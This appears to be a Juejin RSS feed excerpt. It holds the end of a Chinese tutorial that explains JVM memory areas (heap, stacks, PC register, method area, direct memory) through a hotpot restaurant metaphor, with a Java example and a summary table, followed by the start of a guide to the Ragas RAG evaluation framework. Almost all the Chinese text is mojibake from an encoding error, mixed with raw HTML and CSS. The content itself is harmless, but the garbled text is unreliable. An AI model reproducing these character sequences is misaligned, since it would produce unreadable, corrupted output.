âš ï¸Â <strong>é‡ç‚¹</strong>ï¼šè¿™é‡Œæœ‰ä½<strong>æ— æƒ…çš„ä¿æ´é˜¿å§¨ï¼ˆGCï¼‰</strong>ï¼Œå¥¹å¤©å¤©åœ¨æ¡Œè¾¹å·¡é€»ã€‚ä¸€æ—¦å‘ç°å“ªç›˜èœï¼ˆå¯¹è±¡ï¼‰è™½ç„¶å ç€åœ°å„¿ï¼Œä½†å·²ç»æ²¡æœ‰æœåŠ¡å‘˜ï¼ˆå¼•ç”¨ï¼‰åœ¨ä¹å®ƒäº†ï¼Œå¥¹åæ‰‹å°±æ˜¯ä¸€ä¸ªå›æ”¶ï¼è¿™ä¹Ÿæ˜¯æœ€å®¹æ˜“çˆ†æ»¡ï¼ˆOOMï¼‰çš„åœ°æ–¹ã€‚</li>
<li><strong>æœ‰è¶£çš„äº‹å®</strong>ï¼šå †è¿˜åˆ†"å¹´è½»ä»£"å’Œ"è€å¹´ä»£"ï¼Œå°±åƒç«é”…åº—çš„"æ–°é²œé£ŸæåŒº"å’Œ"è…Œåˆ¶é£ŸæåŒº"ã€‚</li>
</ul>
<h3 data-id="heading-4">3. è™šæ‹Ÿæœºæ ˆ (VM Stack) â€”â€” æœåŠ¡å‘˜æ‰‹é‡Œçš„æ‰˜ç›˜ ğŸ¥</h3>
<ul>
<li><strong>è°èƒ½è¿›</strong>ï¼šä¸€äººä¸€ä¸ªï¼Œåˆ«æŠ¢ã€‚(çº¿ç¨‹ç§æœ‰ï¼Œç”Ÿå‘½å‘¨æœŸæçŸ­)</li>
<li><strong>å’‹å›äº‹</strong>ï¼š<br/>
æ¯ä¸ªæœåŠ¡å‘˜ï¼ˆçº¿ç¨‹ï¼‰æ‰‹é‡Œéƒ½ç«¯ç€ä¸ª<strong>æ‰˜ç›˜</strong>ã€‚<br/>
æ¥å¾…ä¸€æ¡Œå®¢äººï¼ˆè°ƒç”¨ä¸€ä¸ªæ–¹æ³•ï¼‰ï¼Œå°±å¾€æ‰˜ç›˜ä¸Šæ”¾ä¸€ä¸ªæ ¼å­ï¼ˆ<strong>æ ˆå¸§</strong>ï¼‰ã€‚<br/>
æ ¼å­é‡Œå†™ç€ï¼šå®¢äººç‚¹çš„å•ï¼ˆ<strong>å±€éƒ¨å˜é‡</strong>ï¼‰ã€èœåœ¨å¤§åœ†æ¡Œå“ªä¸ªä½ç½®ï¼ˆ<strong>å¼•ç”¨</strong>ï¼‰ã€‚<br/>
è¿™æ¡Œèµ°äº†ï¼ˆæ–¹æ³•æ‰§è¡Œå®Œï¼‰ï¼Œæ ¼å­ç›´æ¥æ’¤ï¼Œç›˜å­ä¸€æ”¶ï¼Œå¹²å¹²å‡€å‡€ã€‚</li>
<li><strong>æ³¨æ„</strong>ï¼šæ‰˜ç›˜å¤§å°æœ‰é™ï¼Œå¦‚æœç›˜å­å †å¤ªé«˜ï¼ˆé€’å½’å¤ªæ·±ï¼‰ï¼Œå°±ä¼š"æ‰˜ç›˜æº¢å‡º" (StackOverflowError) !</li>
</ul>
<h3 data-id="heading-5">4. ç¨‹åºè®¡æ•°å™¨ (PC Register) â€”â€” æœåŠ¡å‘˜çš„å°æœ¬æœ¬ ğŸ“</h3>
<ul>
<li><strong>è°èƒ½è¿›</strong>ï¼šä¸€äººä¸€ä¸ªï¼Œä¸ä»…å°è¿˜ä¸èµ·çœ¼ã€‚(çº¿ç¨‹ç§æœ‰ï¼Œå†…å­˜æå°ï¼Œå”¯ä¸€ä¸ä¼šå†…å­˜æº¢å‡ºçš„åŒºåŸŸ)</li>
<li><strong>å’‹å›äº‹</strong>ï¼š<br/>
è¿™æ˜¯æœåŠ¡å‘˜çš„<strong>éšèº«è®°äº‹æœ¬</strong>ã€‚<br/>
æ­£å¹²ç€æ´»å‘¢ï¼Œç»ç†å–Šå»æ¬é…’ï¼ˆçº¿ç¨‹åˆ‡æ¢ï¼‰ï¼Œå›æ¥å¾—çŸ¥é“åˆšæ‰æ´»å¹²åˆ°å“ªäº†å§ï¼Ÿ<br/>
â€œå“¦ï¼Œåˆšæ‰æ­£è¦ç»™ 3 å·æ¡ŒåŠ æ±¤ï¼ˆæ‰§è¡Œåˆ°ç¬¬ 15 è¡Œï¼‰â€ï¼Œå…¨é å®ƒè®°ç€ã€‚<strong>å…¨åº—å”¯ä¸€ä¸ä¼šç‚¸ï¼ˆOOMï¼‰çš„åœ°æ–¹ã€‚</strong></li>
</ul>
<h3 data-id="heading-6">5. æœ¬åœ°æ–¹æ³•æ ˆ (Native Method Stack) â€”â€” å¤–è˜çš„å¼‚å›½æ–™ç†å¸ˆå‚… ğŸ‘¨â€ğŸ³</h3>
<ul>
<li><strong>è°èƒ½è¿›</strong>ï¼šä¸€äººä¸€ä¸ªã€‚(çº¿ç¨‹ç§æœ‰)</li>
<li><strong>å’‹å›äº‹</strong>ï¼š<br/>
Java å¨å¸ˆæä¸å®šçš„ç¡¬èœï¼ˆåº•å±‚ç¡¬ä»¶æ“ä½œï¼‰ï¼Œéœ€è¦è°ƒç”¨ C/C++ å†™çš„nativeæ–¹æ³•ï¼Œè¿™å—åŒºåŸŸå°±æ˜¯ç»™è¿™äº›"å¤–è˜å¤§å¨"ç”¨çš„ä¸“ç”¨å¨æˆ¿ã€‚</li>
<li><strong>å†·çŸ¥è¯†</strong>ï¼šè™½ç„¶é€»è¾‘ä¸Šå®ƒä¿©æ˜¯åˆ†å¼€çš„ï¼Œä½†æœ€å¸¸ç”¨çš„ HotSpot è™šæ‹Ÿæœºä¸ºäº†çœäº‹ï¼Œç›´æ¥æŠŠâ€œå¤–è˜å¨æˆ¿â€å’Œâ€œæœåŠ¡å‘˜æ‰˜ç›˜â€åˆäºŒä¸ºä¸€äº†ï¼ˆæœ¬åœ°æ–¹æ³•æ ˆå’Œè™šæ‹Ÿæœºæ ˆåˆä½“ï¼‰ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-7">ğŸ’» ç°åœºæ¼”ç¤ºï¼šä¸€è¡Œä»£ç çš„"ç«é”…ä¹‹æ—…"</h2>
<p>æˆ‘ä»¬é€šè¿‡ä¸€æ®µä»£ç ï¼ŒæŠŠè¿™äº›æ¦‚å¿µä¸²èµ·æ¥ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HotPotRestaurant</span> {
    <span class="hljs-comment">// ã€æ–¹æ³•åŒºã€‘ï¼šstatic å˜é‡ï¼Œå±äºç±»ä¿¡æ¯</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">shopName</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Re-Zero Hotpot"</span>;
    
    <span class="hljs-comment">// ã€å¸¸é‡æ± ã€‘ï¼šæ ‡å‡†é…æ–™(å¦‚"Spicy")ï¼Œè°ç”¨è°æ‹¿ï¼Œé€»è¾‘ä¸Šå±äºæ–¹æ³•åŒºçš„ä¸€éƒ¨åˆ†</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FLAVOR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Spicy"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// ã€æ ˆã€‘ï¼šmainæ–¹æ³•æ ˆå¸§å…¥æ ˆ</span>
        <span class="hljs-comment">// ã€å †ã€‘ï¼šnewå‡ºæ¥çš„å¯¹è±¡æ”¾åœ¨å †é‡Œ</span>
        <span class="hljs-comment">// ã€æ ˆã€‘ï¼šwaiterå˜é‡åªæ˜¯å¼•ç”¨ï¼Œæ”¾åœ¨æ ˆå¸§çš„å±€éƒ¨å˜é‡è¡¨é‡Œ</span>
        <span class="hljs-type">HotPotRestaurant</span> <span class="hljs-variable">waiter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotPotRestaurant</span>();
        
        waiter.serve();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serve</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ã€æ ˆã€‘ï¼šserveæ–¹æ³•æ ˆå¸§å…¥æ ˆ</span>
        <span class="hljs-comment">// ã€æ ˆã€‘ï¼šå±€éƒ¨å˜é‡countå­˜åœ¨æ ˆå¸§é‡Œ</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>; 
        
        <span class="hljs-comment">// ã€å †ã€‘ï¼šBeefå¯¹è±¡åœ¨å †é‡Œåˆ†é…å†…å­˜</span>
        <span class="hljs-comment">// ã€æ ˆã€‘ï¼šbeefå¼•ç”¨æŒ‡å‘å †é‡Œçš„å¯¹è±¡</span>
        <span class="hljs-type">Beef</span> <span class="hljs-variable">beef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Beef</span>();
        
        <span class="hljs-comment">// ã€æ–¹æ³•åŒºã€‘ï¼šè®¿é—®é™æ€å˜é‡</span>
        System.out.println(<span class="hljs-string">"Welcome to "</span> + shopName);
    }
    <span class="hljs-comment">// serveæ–¹æ³•ç»“æŸ -&gt; æ ˆå¸§å¼¹å‡º -&gt; countå’Œbeefå¼•ç”¨é”€æ¯</span>
    <span class="hljs-comment">// å †é‡Œçš„Beefå¯¹è±¡å˜æˆ"å­¤å„¿"ï¼Œç­‰å¾…GCå›æ”¶</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Beef</span> {
    <span class="hljs-comment">// ç®€å•çš„é£Ÿæç±»</span>
}
</code></pre>
<h3 data-id="heading-8">ğŸ§  å†…å­˜åŠ¨æ€å›¾è§£(Text Version)</h3>
<p>å½“ä»£ç è·‘åˆ°Â <code>serve()</code>Â é‡Œé¢æ—¶ï¼Œä½ çš„è„‘å­é‡Œåº”è¯¥æœ‰è¿™å¼ å›¾ï¼š</p>
<pre><code class="hljs language-Plaintext" lang="Plaintext">       ã€æ ˆ (Stack)ã€‘                 ã€å † (Heap)ã€‘
+------------------------+      +-------------------------+
| [ æ ˆå¸§: serve() ]      |      |                         |
| ---------------------- |      |   +-----------------+   |
| å±€éƒ¨å˜é‡ count = 2      |      |   |  Beef Object    |   |
| å¼•ç”¨ beef  ----------&gt; | ---&gt; |   | (åœ°å€: 0x999)    |   |
|                        |      |   +-----------------+   |
+------------------------+      |                         |
| [ æ ˆå¸§: main() ]       |      |   +-----------------+   |
| ---------------------- |      |   | HotPotRestaurant|   |
| å¼•ç”¨ waiter  ---------&gt; | ---&gt; |   | (åœ°å€: 0x666)    |   |
|                        |      |   +-----------------+   |
+------------------------+      +-------------------------+

       ã€æ–¹æ³•åŒº (Method Area)ã€‘
+---------------------------------------+
| ç±»ä¿¡æ¯: HotPotRestaurant.class        |
| é™æ€å˜é‡: shopName = "Re-Zero Hotpot" |
| å¸¸é‡æ± : "Spicy"                       |
+---------------------------------------+
</code></pre>
<hr/>
<h2 data-id="heading-9">ğŸ§± ç¼–å¤–äººå‘˜ï¼šç›´æ¥å†…å­˜ (Direct Memory)</h2>
<p>é™¤äº†ä¸Šé¢ 5 ä¸ªï¼Œè¿˜æœ‰ä¸€ä¸ªç‹ è§’è‰²ï¼š<strong>ç›´æ¥å†…å­˜ (Direct Memory)</strong>ã€‚</p>
<ul>
<li><strong>æ¯”å–»</strong>ï¼š<strong>åå¨çš„â€œå¤–å–ç›´é€šçª—å£â€</strong>ã€‚</li>
<li><strong>ä¸ºå•¥ç”¨å®ƒ</strong>ï¼š<br/>
æ™®é€šä¼ èœï¼ˆIOï¼‰å¾—ä»ä»“åº“ï¼ˆå†…æ ¸æ€ï¼‰æ¬åˆ°å¨æˆ¿ï¼ˆç”¨æˆ·æ€ï¼‰å†ç«¯ç»™å®¢äººï¼Œç´¯æ­»ä¸ªäººã€‚<br/>
ç›´æ¥å†…å­˜ï¼ˆNIOï¼‰å°±æ˜¯å¼€äº†ä¸ªç›´é€šçª—å£ï¼Œç›´æ¥ä»ä»“åº“æ‹¿äº†èœå°±ç»™å®¢äººï¼Œ<strong>é›¶æ‹·è´</strong>ï¼Œå¿«å¾—é£èµ·ï¼</li>
<li><strong>ä»£ä»·</strong>ï¼šè¿™æ˜¯åº—å¤–é¢çš„åœ°ï¼ˆæœ¬åœ°å†…å­˜ï¼‰ï¼Œä¸å½’ JVM ç®¡ï¼Œç”¨å¤šäº†å®¹æ˜“æŠŠåº—å¤–é¢æç‚¸ã€‚</li>
<li><strong>åº”ç”¨</strong>ï¼šNIO çš„DirectBufferå°±ç”¨è¿™ä¸ªï¼Œä¼ è¾“å¤§æ–‡ä»¶æ—¶ç‰¹åˆ«å¿«ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-10">ğŸ“ æ€»ç»“ï¼šé¢è¯•æ•‘å‘½è¡¨</h2>
<p>åˆ«èƒŒé•¿ç¯‡å¤§è®ºäº†ï¼ŒæŠŠè¿™å¼ è¡¨å­˜å¥½ï¼Œé¢è¯•å‰çœ‹ä¸€çœ¼å°±è¡Œï¼š</p>















































<table><thead><tr><th><strong>åŒºåŸŸåç§°</strong></th><th><strong>è‹±æ–‡</strong></th><th><strong>å­˜ä»€ä¹ˆï¼Ÿ(äººè¯ç‰ˆ)</strong></th><th><strong>çº¿ç¨‹å…³ç³»</strong></th><th><strong>ä¼š OOM å—ï¼Ÿ</strong></th></tr></thead><tbody><tr><td><strong>ç¨‹åºè®¡æ•°å™¨</strong></td><td>PC Register</td><td><strong>è®°äº‹æœ¬</strong>ï¼šä¸‹ä¸€è¡Œè¿è¡Œå“ªå¥</td><td>ğŸ”’ ç§æœ‰</td><td>âŒ ä¸ä¼š (å”¯ä¸€)</td></tr><tr><td><strong>è™šæ‹Ÿæœºæ ˆ</strong></td><td>VM Stack</td><td><strong>æ‰˜ç›˜</strong>ï¼šå±€éƒ¨å˜é‡ã€å¼•ç”¨</td><td>ğŸ”’ ç§æœ‰</td><td>âœ… (StackOverflow)</td></tr><tr><td><strong>æœ¬åœ°æ–¹æ³•æ ˆ</strong></td><td>Native Stack</td><td><strong>å¤–è˜å¨æˆ¿</strong>ï¼šC++ æ–¹æ³•</td><td>ğŸ”’ ç§æœ‰</td><td>âœ… (StackOverflow)</td></tr><tr><td><strong>å †</strong></td><td>Heap</td><td><strong>å¤§åœ†æ¡Œ</strong>ï¼šæ‰€æœ‰å¯¹è±¡å®ä¾‹</td><td>ğŸŒ å…±äº«</td><td>âœ… (OOM é«˜å‘åŒº)</td></tr><tr><td><strong>æ–¹æ³•åŒº</strong></td><td>Method Area</td><td><strong>èœå•</strong>ï¼šç±»ç»“æ„ã€é™æ€å˜é‡</td><td>ğŸŒ å…±äº«</td><td>âœ… (å…ƒç©ºé—´ OOM)</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-11">ğŸ¤” æ€è€ƒé¢˜ï¼šString çš„ä¸‰é‡åˆ†èº«</h2>
<p>æˆ‘ä»¬åœ¨ä»£ç é‡Œå†™ï¼š(ä¸è€ƒè™‘å­—ç¬¦ä¸²å¸¸é‡æ± å»é‡ç­‰å¤æ‚æƒ…å†µï¼Œä»…ä»å¯¹è±¡åˆ›å»ºè§’åº¦å›ç­”)</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"abc"</span>);
</code></pre>
<p>ç»“åˆä»Šå¤©çš„çŸ¥è¯†ï¼Œè¯·é—®ï¼š</p>
<ol>
<li>s æ”¾åœ¨å“ªé‡Œï¼Ÿ</li>
<li>new String() æ”¾åœ¨å“ªé‡Œï¼Ÿ</li>
<li>"abc" æ”¾åœ¨å“ªé‡Œï¼Ÿ</li>
</ol>
<p>(æç¤ºï¼šæƒ³æƒ³æ ˆã€å †å’Œæ–¹æ³•åŒº/å¸¸é‡æ± çš„å…³ç³»)</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Ragas å¤§æ¨¡å‹è¯„æµ‹æ¡†æ¶æ·±åº¦è°ƒç ”æŒ‡å—]]></title>    <link>https://juejin.cn/post/7595099230969544713</link>    <guid>https://juejin.cn/post/7595099230969544713</guid>    <pubDate>2026-01-14T15:45:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595099230969544713" data-draft-id="7595030559565135923" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Ragas å¤§æ¨¡å‹è¯„æµ‹æ¡†æ¶æ·±åº¦è°ƒç ”æŒ‡å—"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-14T15:45:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°é•‡cxy"/> <meta itemprop="url" content="https://juejin.cn/user/3318776686718483"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Ragas å¤§æ¨¡å‹è¯„æµ‹æ¡†æ¶æ·±åº¦è°ƒç ”æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3318776686718483/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°é•‡cxy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T15:45:57.000Z" title="Wed Jan 14 2026 15:45:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Ragas å¤§æ¨¡å‹è¯„æµ‹æ¡†æ¶æ·±åº¦è°ƒç ”æŒ‡å—</h2>
<h3 data-id="heading-1">ç›®å½•</h3>
<ul>
<li><a href="#%E4%B8%80ragas-%E6%98%AF%E4%BB%80%E4%B9%88" title="#%E4%B8%80ragas-%E6%98%AF%E4%BB%80%E4%B9%88">ä¸€ã€Ragas æ˜¯ä»€ä¹ˆ</a></li>
<li><a href="#%E4%BA%8C%E6%A0%B8%E5%BF%83%E8%AF%84%E4%BC%B0%E6%8C%87%E6%A0%87" title="#%E4%BA%8C%E6%A0%B8%E5%BF%83%E8%AF%84%E4%BC%B0%E6%8C%87%E6%A0%87">äºŒã€æ ¸å¿ƒè¯„ä¼°æŒ‡æ ‡</a></li>
<li><a href="#%E4%B8%89%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE" title="#%E4%B8%89%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE">ä¸‰ã€å®‰è£…ä¸é…ç½®</a></li>
<li><a href="#%E5%9B%9B%E5%AE%8C%E6%95%B4%E4%BD%BF%E7%94%A8%E6%B5%81%E7%A8%8B" title="#%E5%9B%9B%E5%AE%8C%E6%95%B4%E4%BD%BF%E7%94%A8%E6%B5%81%E7%A8%8B">å››ã€å®Œæ•´ä½¿ç”¨æµç¨‹</a></li>
<li><a href="#%E4%BA%94%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AF%84%E4%BC%B0%E6%8C%87%E6%A0%87" title="#%E4%BA%94%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AF%84%E4%BC%B0%E6%8C%87%E6%A0%87">äº”ã€è‡ªå®šä¹‰è¯„ä¼°æŒ‡æ ‡</a></li>
<li><a href="#%E5%85%AD%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5" title="#%E5%85%AD%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5">å…­ã€æœ€ä½³å®è·µ</a></li>
<li><a href="#%E4%B8%83%E8%BF%9B%E9%98%B6%E5%8A%9F%E8%83%BD" title="#%E4%B8%83%E8%BF%9B%E9%98%B6%E5%8A%9F%E8%83%BD">ä¸ƒã€è¿›é˜¶åŠŸèƒ½</a></li>
<li><a href="#%E5%85%AB%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98" title="#%E5%85%AB%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98">å…«ã€å¸¸è§é—®é¢˜</a></li>
<li><a href="#%E4%B9%9D%E7%9B%B8%E5%85%B3%E8%B5%84%E6%BA%90" title="#%E4%B9%9D%E7%9B%B8%E5%85%B3%E8%B5%84%E6%BA%90">ä¹ã€ç›¸å…³èµ„æº</a></li>
</ul>
<hr/>
<h3 data-id="heading-2">ä¸€ã€Ragas æ˜¯ä»€ä¹ˆ</h3>
<p><strong>Ragas</strong>ï¼ˆRetrieval-Augmented Generation Assessmentï¼‰æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºè¯„ä¼° <strong>RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰ç³»ç»Ÿ</strong> æ€§èƒ½çš„ Python å¼€æºæ¡†æ¶ã€‚</p>
<h4 data-id="heading-3">1.1 æ ¸å¿ƒä»·å€¼</h4>





























<table><thead><tr><th>ä»·å€¼ç‚¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>è¯„ä¼°é©±åŠ¨å¼€å‘</strong></td><td>å°†è¯„ä¼°èå…¥å¼€å‘æµç¨‹ï¼Œè€Œéäº‹åè¡¥å……</td></tr><tr><td><strong>è‡ªåŠ¨åŒ–æµ‹è¯•</strong></td><td>è‡ªåŠ¨æµ‹è¯• RAG ç³»ç»Ÿçš„å„ä¸ªç»„ä»¶</td></tr><tr><td><strong>å¤šæ¨¡å‹æ”¯æŒ</strong></td><td>æ”¯æŒæœ¬åœ°å’Œäº‘ç«¯å¤§æ¨¡å‹ä½œä¸ºè¯„ä¼°å™¨</td></tr><tr><td><strong>å¯é‡åŒ–æŒ‡æ ‡</strong></td><td>æä¾›æ•°å€¼åŒ–çš„æ€§èƒ½è¯„ä¼°æŒ‡æ ‡</td></tr><tr><td><strong>æ˜“äºé›†æˆ</strong></td><td>ä¸ LangChainã€LlamaIndex ç­‰æ¡†æ¶æ— ç¼å¯¹æ¥</td></tr></tbody></table>
<h4 data-id="heading-4">1.2 é€‚ç”¨åœºæ™¯</h4>
<pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     Ragas é€‚ç”¨åœºæ™¯                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  âœ“ çŸ¥è¯†åº“é—®ç­”ç³»ç»Ÿè¯„ä¼°                                    â”‚
â”‚  âœ“ ä¼ä¸šçº§ RAG åº”ç”¨æ€§èƒ½ç›‘æ§                              â”‚
â”‚  âœ“ ä¸åŒæ£€ç´¢ç­–ç•¥å¯¹æ¯”åˆ†æ                                  â”‚
â”‚  âœ“ LLM å¹»è§‰æ£€æµ‹                                          â”‚
â”‚  âœ“ CI/CD è‡ªåŠ¨åŒ–æµ‹è¯•                                      â”‚
